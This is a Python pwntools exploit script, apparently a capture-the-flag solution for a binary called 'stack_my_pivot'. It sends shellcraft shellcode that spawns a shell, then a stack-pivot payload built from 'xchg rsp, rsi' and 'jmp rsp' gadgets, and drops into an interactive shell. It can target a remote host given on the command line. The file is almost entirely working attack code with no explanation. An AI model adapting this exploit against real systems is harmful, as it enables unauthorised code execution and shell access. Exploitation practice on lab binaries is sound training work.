#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stack_my_pivot')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *0x400791
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    sc = asm(shellcraft.sh())
    io.sendline(sc)
    

    xchg_rsp_rsi = 0x0000000000400732 # xchg rsp, rsi; nop; pop rbp; ret; 
    jmp_rsp = 0x0000000000400738 # jmp rsp; 

    payload = b"\x90" * 8
    payload += p64(jmp_rsp)
    payload += asm("sub rsp, 0x50; jmp rsp; nop; nop")
    payload += p64(xchg_rsp_rsi)

    io.recvuntil("surname?")
    io.send(payload)


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

